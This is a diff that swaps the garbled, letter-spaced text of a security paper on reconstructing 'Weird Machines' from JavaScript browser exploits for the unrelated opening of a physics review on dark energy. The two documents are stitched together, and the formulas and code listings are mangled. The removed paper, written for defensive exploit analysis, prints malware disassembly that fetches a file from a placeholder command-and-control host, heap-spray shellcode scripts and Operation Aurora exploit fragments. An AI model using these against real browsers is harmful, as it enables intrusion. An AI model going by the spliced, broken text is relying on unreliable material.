@@ -1,943 +1,1202 @@
-Casting exploit analysis as a Weird Machine
-reconstruction problem
-Robert Abela and Mark Vella
-Department of Computer Science
-University of Malta
-Msida, Malta
-Email: {Robert.Abela.15, Mark.Vella}@um.edu.mt
-Abstract—Exploits constitute malware in the form of application inputs. They take advantage of security vulnerabilities inside
-programs in order to yield execution control to attackers. The
-root cause of successful exploitation lies in emergent functionality
-introduced when programs are compiled and loaded in memory
-for execution, called ‘Weird Machines’ (WMs). Essentially WMs
-are unexpected virtual machines that execute attackers’ bytecode,
-complicating malware analysis whenever the bytecode set is
-unknown. We take the direction that WM bytecode is best
-understood at the level of the process memory layout attained by
-exploit execution. Each step building towards this memory layout
-comprises an exploit primitive, an exploit’s basic building block.
-This work presents a WM reconstruction algorithm that works by
-identifying pre-defined exploit primitive-related behaviour during
-the dynamic analysis of target binaries, associating it with the
-responsible exploit segment - the WM bytecode. In this manner
-any analyst familiar with exploit programming will immediately
-recognise the reconstructed WM bytecode’s semantics. This work
-is a first attempt at studying the feasibility of this method and
-focuses on web browsers when targeted by JavaScript exploits.
-Keywords—malware analysis; script exploits; weird machines;
-dynamic binary analysis
+Is “Dark Energy” a Quantum Vacuum Energy?
+We review the origins, motivations, and implications for cosmology and black holes, of our
+proposal that “dark energy” is not a quantum vacuum energy, but rather arises from a Weyl
+scaling invariant nonderivative component of the gravitational action.
 I. INTRODUCTION
-Exploits are a peculiar kind of malware, where rather
-than constituting a properly packaged executable binary or
-script/macro, they take the form of application inputs. Exploits
-take advantage of security flaws along with intended and
-unintended functionality inside applications in order to subvert
-their control flow. The shifting of application execution control
-to the attacker renders exploits and ideal entry point for
-intrusions. A typical scenario is that of drive-by-downloads [1]
-where application inputs in the form of malicious HTML that
-embed malicious client-side scripts, target memory corruption errors, e.g. buffer overflows or dangling pointers, inside
-web-browser/script-engine/browser-plugin code. The aim is
-to subvert the browser’s execution and make it download
-‘conventional malware’, such as a backdoor or a commandand-control bot in order to complete a stealthy intrusion.
-While a multitude of vulnerability types abound, memory
-errors are quite distinguished due to their ability to yield the
-target’s computational power to the attacker all along with its
-security privileges, and are the focus of this work. Moreover
-we focus specifically on JavaScript exploits [2] targeting web
-browsers for the time being, although the longer term goal is
-to encompass all exploit forms.
-The mainstream view on exploits is that: security vulnerabilities are their sole cause for success; exploits are as
-ad-hoc as much as the process of vulnerability introduction
-is; and that vulnerability elimination is the only way to
-secure application code-bases. Yet, this view misses the crucial
-emergent behaviour introduced when programs are compiled
-and loaded in memory for execution, and is what makes
-exploit programming possible. The term Weird Machine (WM)
-has been coined to refer to the instance when this emergent
-functionality is leveraged by attackers, and which presents a
-more complete/less ad-hoc view of the actual situation [3].
-Think of this WM as some virtual machine that takes programs
-written in the bytecode that it understands for execution as
-input, and outputs the programs’ results (section II). The main
-point here is that the WM bytecode is not some documented
-VM instruction set, rather it is unknown.
-In the field of malware analysis, WMs complicate the process of inferring malicious behaviour from JavaScript exploits
-since the script statements have to be analysed in terms of
-bytecode intended for the, yet unknown, WM as targeted by
-the exploit writer. As an example let’s compare Listings 1
-and 2. The former is a snippet taken from the disassembly
-of a conventional binary malware. In this case the malware’s
-behaviour can be directly inferred from the semantics of the
-physical machine instructions and system API calls: lines 1-
-8 set up the arguments for the InternetOpenUrlA call
-on line 9, and depending on it’s return value execution is
-forked on lines 10-12 to possibly download cc.htm from
-http://www.attackercnc.com on line 14.
-Listing 1
-BINARY MALWARE DISSASSEMBLY
-1 . . . s n i p . . .
-2 p u s h 0 x 4 0 7 0 f 4 ; ” M o zill a / 5 . 0 ( Windows NT 6 . 3 ; . . . ”
-3 c a l l dword [ d s : im p I nt e r n etO p e nA ]
-4 mov dword [ s s : ebp+ va r C ] , ea x
-5 . . . s n i p . . .
-6 p u s h 0 x4070c4 ; ” h t t p : / / www. a t t a c k e r c n c . com / cc . htm ”
-7 mov eax , dword [ s s : ebp+ va r C ]
-8 p u s h ea x
-9 c a l l dword [ d s : im p I nt e r n et O p e n U rl A ]
-10 mov dword [ s s : ebp+ v a r 1 0 ] , ea x
-11 cmp dword [ s s : ebp+ v a r 1 0 ] , 0 x0
-12 j n e 0 x40109d
-13 . . . s n i p . . .
-14 c a l l dword [ d s : i m p I n t e r n e t R e a d F i l e ]
-15 . . . s n i p . . .
-The latter HTML-embedded JavaScript sample is more
-arXiv:2109.13100v1 [cs.CR] 27 Sep 2021
-intricate. At face value lines 6-7 create a hidden HTML layer,
-lines 8-9 create a very long string which is then used as a
-property value to the multitude of HTML buttons added to
-this invisible layer on lines 10-15. In web design terms this
-snippet is pretty much useless. Yet this is none other than a
-WM bytecode sequence intended to setup attacker-controlled
-physical machine instructions inside the browser’s memory
-and eventually executed by subsequent statements that exploit
-the presence of a memory error inside the browser’s codebase. Thus, reconstructing the WM bytecode is the essential
-first step for exploit analysis.
-Listing 2
-JAVASCRIPT EXPLOIT MALWARE
-1 <html>
-2 <head></head>
-3 <body>
-4 <di v i d =” bl a h ”></di v>
-5 <s c r i p t l a n g u a g e = ’ j a v a s c r i p t ’>
-6 v a r d i v c o n t a i n e r = document . g et El e m e nt b y I d ( ” bl a h ” ) ;
-7 d i v c o n t a i n e r . s t y l e . c s s T e x t = ” d i s p l a y : none ” ;
-8 v a r d a t a = u n e s c a p e ( ”% 9 0 9 0%... s n i p . . . %CCCC . . . ” ) ;
-9 w hil e ( d a t a . l e n g t h < 0 x80000 ) d a t a += d a t a ;
-10 f o r ( v a r i = 0; i <0x250 ; i ++ )
-11 {
-12 v a r o bj = document . c r e a t e E l e m e n t ( ” b u t t o n ” ) ;
-13 o bj . t i t l e = d a t a . s u b s t r i n g ( 0 , 0 x40000 −0 x58 ) ;
-14 d i v c o n t a i n e r . a p p e n dC hil d ( o bj ) ;
-15 } . . . s n i p . . .
-16 </ s c r i p t >
-17 </body>
-18 </ html>
-In-line with the above example, we postulate that from
-an exploit analysis point-of-view, the WM bytecode is best
-understood at the level of the process memory layout that
-exploits are programmed to attain, eventually enabling them to
-program the WM. Each step taken to build towards this layout
-comprises an exploit primitive: the basic building blocks of
-exploit programming. This way any analyst familiar with
-exploit programming will immediately recognize the bytecode’s semantics. This work is a first attempt at studying the
-feasibility of this approach, and as far as we know we are the
-first to cast exploit analysis as a WM reconstruction problem.
-The end result is a WM reconstruction algorithm that works
-by identifying pre-defined exploit primitive-related runtime
-behaviour during dynamic binary analysis and subsequently
-associating it with the responsible exploit snippet as fed as
-input to the target browser (section III). The implicated script
-statements constitute the WM’s bytecode syntax, the machine’s
-opcodes so to speak, while the exploit primitives assigned
-to them through appropriate labels provide their semantics.
-Experimentation with 4 popular exploit primitives as used by
-3 script exploit case studies (section IV) demonstrate that detecting WM bytecode syntax and their semantics using exploit
-primitives is possible by defining the primitives as program
-memory-level state transitions. In turn the case studies show
-that having a WM reconstruction algorithm at the heart of
-an exploit analysis tool helps the analyst to move beyond the
-script’s superficial semantics and into the program memory
-level, which is what matters when understanding exploits.
-Finally, experimentation outcome provides the basis for a
-research direction for completing the work on a finalized
-Application
-functionality &
-bugs
-Application input
-e.g.HTML+JavaScript
-Application output
-e.g. Web page
-Weird Machine bytecode P
-WM
-e.g. Drive­by­download
-P
-WM output 
-e.g. Backdoor installation
-Emergent functionality ­
-the Weird Machine
-Fig. 1: Weird Machines: Emergent program functionality that
-produce unexpected virtual machines.
-exploit analysis tool usable in a wider array of exploit forms
-(sections V and VI).
-II. BACKGROUND AND RELATED WORK
-The Weird Machines (WM) targeted by attackers are none
-other than emergent program functionality as generated by
-compilers, linkers and program loaders in the process of executable image creation and loading. The resulting executable
-inside program memory comprises machine code and data that
-has been for long treated as obscure/uninteresting material
-by computer scientists, even though this is where attackers
-thrive [3]. Access to this emergent functionality in fact requires substantial knowledge of what goes on at the program
-memory level, along with the presence of memory errors
-for activating its full malicious potential. Fig. 1 depicts the
-scenario of programming a WM emerging from web browsers.
-The intended functionality here constitutes the parsing of
-HTML documents into some intermediate representation, e.g.
-Document Object Model (DOM) tree, which is then fed to
-a rendering algorithm for on-screen visualization. Embedded
-JavaScript snippets, or any supported scripting language for
-that matter, are instead passed on to a script engine for
-interpretation/just-in-time compilation. Ultimately, a number
-of statements constitute calling back into the browser (and
-it’s extensions) to dynamically update the rendered page. The
-code-base concerned is typically natively coded in C, or any
-of its derivatives, and which is a process highly prone to
-the introduction of memory errors, e.g. see [4], resulting in
-particularly dangerous WM bytecode that can fully subvert
-the executable’s control flow.
-This is what happens in the case of drive-by-downloads,
-where using scripts similar to the one shown in Listing 2
-as input WM programs P WM made up of WM bytecode,
-these are processed by the emerging WM to compute P WM’s
-output, e.g. backdoor installation. So far the WM concept
-has been used to explain the computational hardness of the
-input sanitization problem as a means to eliminate security-
-related errors inside parser code-bases whenever processing
-untrusted application inputs. Its proponents suggest a formal
-language/parser-generation approach to secure coding [5].
-Subsequently, investigation of the WM concept has been taken
-beyond software programs and into the hardware domain [6].
-Scripts exploits have been of particular interest in recent
-years since they improve upon earlier file/network packet
-exploit techniques in order to break modern exploit deferences
-[7]. In turn these exploits have become much more daunting to
-understand. Listing 3 depicts the layout of a typical file exploit,
-that usually contains some string intended to both corrupt a
-function pointer in memory as well as the compiled malicious code to be executed. In contrast, script exploits involve
-multiple steps that create a specific program memory layout
-before successful exploitation can take place, typically aiming
-to divert execution to some earlier created string whose content
-doubles as valid machine code. Nowadays, exploit sophistication has increased to the level where existing executable
-content inside the browser’s memory can be searched for and
-re-composed in a way to create new computations on-the-fly.
-This way a myriad of exploit mitigations can be defeated.
-As a result, manually inferring the exploit sequence proves
-to be a painstaking process that requires intimate knowledge
-of complex script engines, document parsers, as well the
-interaction between the two, e.g. see [8]. Rather, an exploit
-analysis tool that labels simple/compound scripts statements as
-WM bytecode, and whose semantics are grounded in exploit
-primitive behaviour, would only require knowledge of exploit
-programming in general.
-Listing 3
-FILE EXPLOIT FRAGMENT
-| Hea de r f i e l d 1 | Hea de r f i e l d 2 | 90 90 90 . . .
-( v e r y l o n g s t r i n g ) . . . CC CC CC CC CC . . .
-Exploit analysis is a specific instance of malware analysis
-in general, which is an incident response task that studies
-malware samples acquired during digital investigation. Its aim
-is to infer malware objectives from compiled code to produce
-actionable information in the form of intrusion detection rulesets and dis-infection routines. Exploit analysis specifically is
-concerned with improving upon existing exploit mitigations
-as well as to inform more secure code-bases in general.
-Research-wise, exploration has been mainly concerned with
-the complete exposure of malicious behaviour inside malware sandboxes, and therefore providing effective automation.
-The main challenge here is posed by hidden/trigger-based
-behaviour that eludes sandboxes [9]. This is typically handled
-as a state-space exploration problem solvable using symbolic
-execution of binaries [10]. Taint analysis is a complementary
-technique used to identify the data objects of interest so
-as to solely apply expensive symbolic execution upon those
-traces that process these objects, while concretely executing
-the remaining ones [11]. Once the sought after behaviour is
-finally exposed it is paramount that this is recognized as such
-[12].
-The work closest to ours, JScalpel, builds upon this
-approach with the purpose of identifying just the execution
-of the injected code, distinguishing it from browser/engine
-activity during dynamic binary analysis [13]. This method
-however disregards explaining the overall exploit strategy
-and highlighting, for example, how existing mitigations are
-being bypassed or which statements actively program the
-emerging WM. Yet, it does acknowledge the value of aiding
-the analyst in fully understanding exploits by weeding out
-statements that do not contribute to exploitation. By focusing
-on WM reconstruction, we propose that exploit scripts can be
-labelled in a way to support the analyst throughout the entire
-exploitation sequence.
-III. WEIRD MACHINE RECONSTRUCTION
-The WM reconstruction algorithm revolves around the notion of an exploit primitive which was first coined in [14].
-Informally, and within the specific context of script exploits,
-it refers to a simple or compound script statement that provides
-access to a program memory-level (native) operation that
-would otherwise not be directly available at script-level. Here,
-we are interested in characterizing WM bytecode in terms of
-exploit primitives, with the WM bytecode space encompassing
-all possible exploit primitives, while the primitives’ behaviour
-provide bytecode with their semantics. Formally:
-Definition 1. An exploit primitive’s behaviour, as identified
-through its primitive label l is defined as: the program memory
-state transition function δl
-: P(W) × Σ → P(W0
-); where
-W = {w0, w1, w2, ..., wn} and W0 = {w
-0
-0
-, w0
+In a series of papers, Refs. [1]–[7], we have proposed an alternative theory for the “dark energy”
+that drives the accelerated expansion of the universe. In this theory, dark energy is not a vacuum
+energy, but rather arises from a modification of the usual cosmological constant action that renders
+it Weyl scaling invariant. The aim of this article is to give a concise review of our work, from the
+initial proposal and checks for consistency with established observations, through implications of
+the modified action for late time cosmology and for the physics of black hole horizons, to open
+problems and observational tests.1
+II. THE CONVENTIONAL PICTURE OF “DARK ENERGY”
+An important development in observational cosmology over the last two decades has been the
+discovery that the expansion of the universe is accelerating.[8] This is conventionally interpreted
+as evidence for a cosmological “vacuum energy” term in the gravitational action of the form,
+Scosm = −
+Λ
+8πG Z
+d
+4x(
+(4)g)
+1/2
+, (1)
+with the cosmological constant Λ given by Λ = 3H2
+0ΩΛ in terms of the Hubble constant H0
+and the cosmological fraction ΩΛ. This functional form incorporates the usual assumption that
+gravitational physics, including the dark energy that leads to accelerated expansion of the universe,
+is four-space general coordinate invariant, with no frame dependence in the fundamental action.
+∗Electronic address: adler@ias.edu
 1
-, w0
+In the papers Refs. [1]–[6] we used a (+, −, −,−) metric convention; in the papers Refs. [7], [31] we used a
+(−, +,+, +) metric convention. So (4)g ≡ −Det(gµν) is positive in both conventions. We follow the originally used
+conventions in discussing the respective sets of papers. In Eqs. (2) and (3), we adopt the convention of setting the
+Planck constant ~ and the velocity of light c to unity, ~ = c = 1. In Eqs. (15) and (16) and Sec. VIIIA we set the
+Newton constant G to unity, G = 1.
 2
-, ..., w0
-n}
-are abstractions over the full program memory state defined as a set of derived values wi and w
-0
-i
-; while Σ =
-{p0, p1, p2, ..., pm} is the set of candidate Weird Machine
-bytecode, where each candidate primitive label pi could be
-associated with a simple or compound statement inside script
-exploit E.
-Definition 2. A Weird Machine with respect to the execution
-of web browser B on input exploit E, denoted by WME→B,
-is defined as: the function fWME→B : Σ → L
-∗
-; where
-L = {l0, l1, l2, ..., ln} is the set of labels, one for each defined
-exploit primitive behaviour in ∆ = {δl0
-, δl1
-, δl2
-, ..., δln
-}. Then
-for some (p, l∗
-) ∈ fWME→B implies that p constitutes valid
-bytecode for WME→B, whose semantics is defined by the
-sequence of δl’s corresponding to the string of labels l
-∗
-.
-Note: fWME→B is not injective, meaning that the same exploit
-primitive label string l
-∗
-could be associated with different
-bytecodes. This is a stark reminder that we are not dealing
-with conventional purposely-designed virtual machines, but
-rather with unintended ‘weird’ ones.
-Therefore WM reconstruction is about identifying the WM
-bytecode’s syntax and semantics so to speak, and comprises:
-i) Choosing the exploit primitives l of interest. ii) Expressing their behaviour in the form of program memory state
-transitions δl
-. iii) Script preparation in terms of identifying
-the script statements that comprise candidate WM bytecode
-p and marking them accordingly. iv) Detecting transitions
-conforming to some δl during the dynamic binary analysis of the browser/engine as executed upon the exploit
-script under analysis. v) Associating any detected δl with
-its corresponding p using label l, which is now confirmed
-as being an exploit primitive/WM bytecode. p is added
-to the WM bytecode set, while δl provides its semantics.
-This procedure is formalized by algorithm 1 - WMRecon.
-It executes until exploit termination or time-out (line 1).
-resumeExecutionUntilNextP() (line 2) executes the
-exploit up until before the next p. During a fresh analysis it
-is line 11 that executes next, calling deriveState() in
-order to compute the abstract program state Wp associated
-with the prior execution of p. In case of simple statements the
-second state W0
-p
-is computed as the resulting state when p gets
-executed by executeComplete() (lines 16-17). Finally,
-lines 18-20 use transitionsIdentify() in order to
-detect a possible sequence of state transitions conforming to
-some δln
-’s in ∆, updating fWME→B accordingly. In case
-a p is associated with a compound statement, the derived
-Wp is pushed onto a stack (lines 12-15), which is then only
-used when all of its corresponding statements have completed
-execution (lines 3-10). In this manner, each individual script
-statement can be associated with multiple candidate WM
-bytecodes, i.e. on its own as well as part of statement blocks.
-Algorithm 1: WMRecon - Weird Machine reconstruction
-Input: Web Browser B, Exploit sample E, Σ as defined over E,
-L = {l0, l1, l2, ..., ln} the set of labels corresponding to
-∆ = {δl1
-, δl2
-, ..., δln
-}
-Output: The reconstructed Weird Machine
-WME→B
-def = fWME→B
-: Σ → L∗
-1 while !(terminates(E) or timesOut(E)) do
-2 p ← ResumeExecutionUntilBeforeNextP(E);
-3 if closesCompound(p) then
-4 W0
-p ← deriveState(B);
-5 (p, Wp) ← popStack(Γ);
-6 if (l
-∗ ← transitionsIdentify(∆, Wp, W0
-p)) 6= 
-then
-7 fWME→B
-(p) = l
-∗ ;
-8 next;
-9 end
-10 end
-11 Wp ← deriveState(B);
-12 if isCompound(p) then
-13 pushStack(Γ, (p, Wp));
-14 next;
-15 end
-16 executeComplete(p);
-17 W0
-p ← deriveState(B);
-18 if (l
-∗ ← transitionsIdentify(∆, Wp, W0
-p)) 6=  then
-19 fWME→B
-(p) = l
-∗ ;
-20 end
-21 end
-22 return fWME→B
-;
-Once incorporated as part of an exploit analysis tool the
-envisaged process, depicted in Fig. 2, proceeds as follows:
-i) The de-obfuscated script (e.g. using JSBeautifier1
-) is
-prepared with markers representing the candidate primitives
-1http://jsbeautifier.org/
-Fig. 2: An example exploit analysis process when using a tool
-that implements WMRecon
-p using the setMarker(‘Candidate primitive’).
-resetMarker() is used to end a marker associated with
-compound statements. This step can be carried out manually
-or can be tool assisted. ii) p markers are then associated with
-WM bytecode labels, e.g. //Loop::AllocPrimitive,
-whenever found to produce exploit primitive behaviour. In this
-case, the candidate primitive marker Loop has been associated
-with the AllocPrimitive exploit primitive, referring to
-its memory allocation behaviour for example. The subsequent
-Info: line further qualifies the observed runtime behaviour.
-The labelled script exploit presents the partially reconstructed
-WM, with the compound for-loop statement block identified as
-valid WM bytecode, whose semantics is to allocate 5 chunks
-of 1MB memory buffers. Completing the WM could require
-further iterations with adjusted markers and further analysis
-iterations.
-IV. EVALUATION
-The idea of doing exploit analysis by reconstructing the
-WMs targeted by the exploit writers is now evaluated for
-its feasibility. Specifically this is carried out in terms of
-expressing exploit primitive behaviour as program memory
-state transition functions (section IV-A) and their effectiveness
-when utilized by a WRecon-based tool (section IV-B) in
-correctly labelling exploit samples (section IV-C), and thus
-accurately reconstructing the WMs concerned.
-A. Exploit primitives
-4 exploit primitives are chosen based on the notion that they
-should provide the script level with access to native operations.
-Each primitive is first informally described, then a C-code
-(native-level) snippet form of description is used as an aid in
-building towards a formal description. Finally the formal δl
-definition is provided, that takes the form of a constraint on
-the prior (W) and post (W0
-) transition states that needs to be
-satisfied by the candidate primitives in Σ to be associated with
-l.
-1) Memory allocation primitive: Allocates a chunk of
-memory on the process heap. At the C code-level, this primitive is described as a function call to the standard C library
-malloc() function. Of course this is just a tool for intuition,
-as in most cases it is not expected that at the script level it will
-be possible to utilize the allocated portion of memory in any
-way the programmer desires, as when programming natively.
-Furthermore, memory allocation could be carried out in various ways even at the native level e.g. directly through a system
-call or else by calling custom memory managers. Consequently
-its behaviour can be expressed over the abstract program
-state W = {w0
-def = ‘Size of allocated heap memory’}, as:
-δmemalloc({w0}, p) = {w
-0
-0}, ∀p such that w
-0
-0 > w0.
-2) Memory freeing primitive: Frees a previously allocated
-chunk of memory on the process heap, as expressed at the
-C code-level through a call to free(). It’s behaviour is
-expressed over the same abstract program state W as the
-previous primitive. In fact its behaviour is exactly the opposite
-and is defined as: δmemf ree({w0}, p) = {w
-0
-0}, ∀p such that
-w
-0
-0 < w0.
-3) Execute crafted code primitive: Sets the program
-counter to an address containing attacker-controlled executable
-content and executes it. As such, the C code-level behaviour
-this time requires a description that is a bit more involved,
-making use of a function pointer initialized to an address
-containing machine instructions that dynamically extends the
-original code-base. The description is as follows:
-v oi d e x e c C r a f t e d {
-v oi d (* f p t r ) ( ) ;
-v oi d t a r g e t a d d r = <p r e d i c t e d / d i s c l o s e d >;
-/ / C o nt a i n s a t t a c k e r − c o n t r o l l e d c o de
-f p t r = t a r g e t a d d r ;
-f p t r ( ) ;
-}
-It is understood that target_addr already contains
-attacker-controlled code from the execution of prior primitives. The same argument applies in case target_addr
-requires disclosing when it cannot be predicted a-priori. Finally, this primitive requires the presence of a memory error
-before it can be made available at the script level, e.g. a
-buffer overflow or a dangling pointer, and thus relates to
-the WM bytecode of the most dangerous kind. The corresponding behaviour is expressed over the abstract program
-state W = {w0
-def = %pc, w1
-def = {‘Expected codebase’}}
-as: δexecCraf ted({w0, w1}, p) = {w
-0
-0
-, w0
-1 = w1}, ∀p such
-that w
-0
-0 6∈ w
-0
-1
-. %pc refers to the program counter register,
-while ‘expected codebase’ refers to the known memory regions
-containing the browser’s code e.g. .text executable image
-sections or heap memory reserved for just-in-time (JIT) script
-engines.
-4) Call stack replacement primitive: Sets the stack
-pointer to an attacker-controlled memory location containing
-a fabricated call stack, corrupting the flow execution on
-return from the innermost function call thereafter. As such,
-the C code-level behaviour is very similar to the previous
-primitive but for two differences. Firstly, it is the presence
-of a fabricated call stack which is being assumed, rather
-than attacker-controlled executable content. Secondly, it is the
-stack pointer register this time being manipulated, hence the
-inline assembly performing a stack pivot. This primitive also
-presupposes a memory error, with its description being:
-v oi d c a l l S t a c k R e p l a c e {
-v oi d t a r g e t a d d r = <p r e d i c t e d / d i s c l o s e d >;
-/ / C o nt ai n s t h e f a b r i c a t e d c a l l s t a c k
-asm v o l a t i l e ( ” mov %r s p , %0” : : ” r ” ( t a r g e t a d d r ) ) ;
-}
-The corresponding behaviour is expressed over the abstract program state W = {w0
-def = %sp, w1
-def =
-{‘Expected call stack’}} as: δcallStackReplace({w0, w1}, p) =
-{w
-0
-0
-, w0
-1 = w1}, ∀p such that w
-0
-0 6∈ w
-0
-1
-. %sp refers to the
-stack pointer register, while ‘expected call stack’ refers to the
-memory regions containing known call stacks for application
-threads.
-B. Prototype implementation
-A prototype of a WMRecon-based tool was developed
-for the Windows OS/Internet Explorer environment, which
-is a popular target for drive-by-downloads. DynamoRIO2
-, a
-dynamic binary analysis framework, was used for tracing the
-web browser’s instructions during state transition monitoring,
-as well as to introspect CPU register values and memory
-content during program state derivation (carried out per basic
-instruction block of the script engine thread). Its umbra
-extension also offers a convenient way to walk Window’s
-process VAD trees (umbra_iterate_app_memory()),
-while at the same time filtering out non-application (i.e.
-analysis-related) VAD nodes. As for heap memory manager
-information, specifically concerning freed/available memory
-regions, these are obtained through KD3
-’s !vm extension
-command.
-Implementation of the setMarker() and
-resetMaker() marker functions (as per Fig. 2)
-are provided inside a marker.js script file and
-which requires inclusion within exploit files during the
-script preparation phase. Their implementation makes
-use of the javascript:alert() function which
-in the case of Internet Explorer results in a call to
-MessageBoxIndirectW(). During program instruction
-tracing, any call to this function with arguments matching
-an expected marker is skipped, with the relevant prior (W)
-and post (W0
-) transition states being computed accordingly.
-The known code and call stack regions required by exploit
-primitives 3 and 4 are computed when execution reaches the
-browser’s WinMain() entry point. Overall, the accuracy of
-program state derivation implemented by the current prototype
-is known to possibly be impacted by multi-threading, as well
-as lack of knowledge of custom memory managers and their
-garbage collectors (typical of script engines).
-2http://www.dynamorio.org/
-3https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger
-C. Case studies
-We now present 3 exploit case studies, each including
-a number of the previously defined exploit primitives and
-ordered according to sophistication. In each case, the preanalysis markers and post-analysis labels are shown in a
-superimposed manner in the corresponding script listings.
-Technical analysis of the 3 exploits are publicly available and
-thus the accuracy of the labelling could be verified against
-them. For each case study, the latest vulnerable OS/browser
-version configurations were used.
-1) Standard heap spray: The first case study is taken
-from a heap spraying tutorial [2], a technique commonly
-used to inject multiple instances of malicious compiled code
-inside the target vulnerable application. The environment
-is Win XP SP3/IE 6.00.2800.1106. Listing 4 shows snippets from the exploit sample. In this study a number of
-memalloc and memfree primitives were expected and
-which were duly labelled on lines 9-11, 23-26, and 32-35.
-Specifically, the while loop on line 12 is identified as a
-sequence of predominantly memory allocations with some
-interleaved frees, with memory[i]=block+shellcode;
-and memory[i]=’’; clearly representing memory allocation and freeing WM bytecodes respectively.
-Listing 4
-STANDARD HEAP SPRAY
-1 <s c r i p t s r c =” ma r ke r . j s ”></ s c r i p t >
-2 <s c r i p t >
-3 v a r s h e l l c o d e = u n e s c a p e ( ’% u\4141%u \4 1 4 1 ’ );
-4 v a r b i g b l o c k = u n e s c a p e ( ’% u\9090%u \9 0 9 0 ’ );
-5 v a r h e a d e r s i z e = 2 0;
-6 v a r s l a c k = h e a d e r s i z e + s h e l l c o d e . l e n g t h ;
-7
-8 s etM a r k e r ( ’ BigBlock ’ ) ;
-9 / / Bi gBl oc k : : . . . SNIP . . . memalloc +memalloc +memalloc+\\
-10 memfree . . . SNIP . . .
-11 / / [ I n f o : . . . SNIP . . . 3 1 KB+63KB+63KB+63KB . . . SNIP . . . ]
-12 w hil e ( b i g b l o c k . l e n g t h < s l a c k )
-13 b i g b l o c k += b i g b l o c k ;
-14 v a r f i l l b l o c k = b i g b l o c k . s u b s t r i n g ( 0 , s l a c k ) ;
-15 v a r bl o c k = b i g b l o c k . s u b s t r i n g \\
-16 ( 0 , b i g b l o c k . l e n g t h − s l a c k ) ;
-17 w hil e ( bl o c k . l e n g t h + s l a c k < 0 x40000 )
-18 bl o c k = bl o c k + bl o c k + f i l l b l o c k ;
-19
-20 v a r memory = new A r r a y ( ) ;
-21 f o r ( i = 0 ; i < 5 0 0; i ++ ) {
-22 s etM a r k e r ( ’ S h ell c o d e ’+ i ) ;
-23 / / S h e l l c o d e 0 : : memalloc
-24 / / [ I n f o : 5 1 1KB]
-25 / / S h e l l c o d e 1 : : memalloc
-26 / / [ I n f o : 5 1 1KB] . . . SNIP . . .
-27 memory [ i ] = bl o c k + s h e l l c o d e ;
-28 }
-29
-30 f o r ( i = 0 ; i < 5 0 0; i ++ ) {
-31 s etM a r k e r ( ’ F ree ’+ i ) ;
-32 / / F r e e 0 : : memalloc
-33 / / [ I n f o : 5 1 1KB]
-34 / / F r e e 1 : : memfree
-35 / / [ I n f o : 5 1 1KB] . . . SNIP . . .
-36 memory [ i ] = ’ ’ ;
-37 }
-38 r e s e tM a r k e r ( ) ;
-39 </ s c r i p t >
-2) Operation Aurora exploit: The second case study is
-taken from a technical blog that analyses the exploit that was
-used in the popular Operation Aurora cyberattack [15]. The
-experimentation setup is identical to the one used for the
-previous exploit. In this case a heap spay is followed by a
-use-after-free (UAF) exploit (CVE 2010-0249) and is representative of typical scenarios where virtual function pointers
-get corrupted as a consequence of non-coordination between
-multiple pointers being used to point to the same object in
-memory. When one of the pointers is used to free the memory
-object with missing/incorrect reference counting, the other
-pointers are left referencing a memory region that can get
-reused at any time, and thus have its virtual function table
-pointer ‘overwritten’ and subsequent behaviour left undefined.
-Listing 5 shows snippets from the exploit sample. Lines 18-
-19 identify the entire function FOverwrite() as valid WM
-bytecode that executes crafted code. In particular the information label //[Info:0x0c0d0c0d on line 19 gives away
-what line 26 is about. Not shown in the snippet is a sequence
-of memory allocation and freeing primitives inside the function
-HeapSpray() that crafts the code in a similar fashion to the
-previous case study. Yet, on lines 12-13 the FRemove marker
-remains unlabelled even though a memfree label is expected.
-What is happening here is that this memory region is being
-freed to a custom allocator but not to the underlying system
-heap memory manager, impacting on a known limitation of
-the prototype.
-Listing 5
-OPERATION AURORA EXPLOIT
-1 <s c r i p t s r c =” ma r ke r . j s ”></ s c r i p t >
-2 <s c r i p t >
-3 . . . SNIP . . .
+The action assumed in Eq. (1) goes back to the inception of general relativity, when Einstein
+introduced a cosmological constant term in the gravitational action, only to soon remove it when
+the Hubble expansion was discovered (but was believed to not accelerate).[9]
+Although the existence of a small acceleration of the expansion of the universe is now firmly
+established,[8] adoption of the action of Eq. (1) to describe it leads to a conundrum known over
+the years as the “cosmological constant problem”, or more accurately, the cosmological constant
+“fine tuning problem”. As written, Eq. (1) interprets Λ as a vacuum energy density,[10]
+ρ
+Λ
+vac =
+Λ
+8πG
+≃ (2 × 10−3
+eV)4
+, (2)
+with G the Newton gravitational constant. However, quantum zero point energies of bosonic and
+fermion fields at the Planck scale correspond to a vacuum fluctuation energy of order
+ρ
+QM
+vac ∼ M4
+Planck = G
+−2 ≃ (1028eV)4
+, (3)
+so that the ratio of the observed cosmological constant, interpreted as a vacuum energy density, to
+the Planck scale quantum fluctuation energy density, is
+ρ
+Λ
+vac
+ρ
+QM
+vac
+≃ 10−123
+. (4)
+To achieve such a small value, a tremendous fine tuning is needed, in order for particle vacuum
+energies to cancel down to the magnitude of ρ
+Λ
+vac. Even if one assumes that there is a (not yet
+observed) supersymmetry in fundamental physics broken only at the TeV scale, so that bosonic
+and fermionic vacuum energies cancel to the TeV level, a fine tuning of order 10−60 is still needed
+if the observed cosmological constant arises as a vacuum energy density.
+Many ideas to explain this fine tuning have been explored in the literature. Perhaps the simplest
+is to assume that the observed dark energy is not a vacuum energy, but arises from new physics
+not interpretable as a vacuum energy. In this case one still has to understand the small numerator
+∼ (10−3
+eV)4
+in Eq. (2), which would be yet another example of the “hierarchy problem” presented
+by the smallness of the known elementary particle masses compared to the Planck mass. This
+hierarchy may arise from a dynamical symmetry breaking chain, or from instanton nonperturbative
+effects. However, the argument for a fine tuned cancellation of vacuum energies is undermined if
+Λ does not arise as a vacuum energy remnant. It may be that the fundamental physics theory
+that underlies both general relativity and quantum field theory has a selection rule that enforces
+exact cancellation of bosonic and fermionic vacuum energies to give zero for the coefficient in Eq.
+(1), with dark energy arising from an action of a different form. This is the avenue that we have
+pursued in our series of articles, and that we will explore in the review that follows.
+3
+III. WEYL’S “GAUGE INVARIANCE”: WEYL SCALING INVARIANCE
+The term “gauge invariance” is most frequently used to describe invariance of a theory of spin
+one fields, either Abelian or non-Abelian, under shifts in the vector potential. However, the term
+was originally introduced into physics by Hermann Weyl, who proposed that “Eich Invarianz”,
+that is invariance under a change of scale, or “gauge”, might be a local symmetry of general
+relativity.[11],[12] Weyl’s gauge invariance is implemented by a transformation of the spacetime
+metric gµν (x) according to
+gµν (x) → λ
+2
+(x)gµν (x) ,
+g
+µν (x) → λ
+−2
+(x)g
+µν (x) ,
+(5)
